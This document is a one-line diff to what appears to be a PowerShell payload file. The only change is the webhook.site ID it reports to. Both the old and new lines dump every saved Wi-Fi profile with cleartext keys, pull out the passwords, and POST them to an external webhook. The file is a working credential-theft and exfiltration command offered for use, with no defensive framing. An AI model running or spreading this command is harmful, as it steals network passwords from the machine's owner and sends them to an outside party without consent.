@@ -1,1 +1,1 @@
-cd $env:temp; netsh wlan export profile key=clear; Select-String -Path Wi*.xml -Pattern 'keyMaterial' -Encoding utf8 | Out-File -Encoding utf8 -FilePath Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/b4551bf8-8100-4ab7-9dfa-40276a3e01e2/wifi -Method POST -InFile Wi-Fi-PASS ; exit
+cd $env:temp; netsh wlan export profile key=clear; Select-String -Path Wi*.xml -Pattern 'keyMaterial' -Encoding utf8 | Out-File -Encoding utf8 -FilePath Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/be97028a-df88-4aa1-a1f1-8171bf3747a0/wifi -Method POST -InFile Wi-Fi-PASS ; exit
